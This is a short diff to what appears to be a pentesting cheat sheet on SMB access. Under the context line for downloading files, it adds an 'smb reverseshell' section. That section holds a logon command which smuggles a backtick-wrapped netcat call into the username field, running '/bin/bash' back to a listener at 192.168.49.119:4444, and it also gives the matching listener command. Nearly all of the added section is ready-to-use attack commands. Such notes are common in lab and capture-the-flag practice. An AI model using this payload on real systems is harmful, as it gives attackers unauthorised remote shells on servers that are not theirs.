@@ -61,3 +61,10 @@ Downloading files from smb
 ```
 get filename.txt
 ```
+
+
+smb reverseshell
+```
+logon “/=`nc 192.168.49.119 4444 -e /bin/bash`"
+nc -vvlp 4444
+```
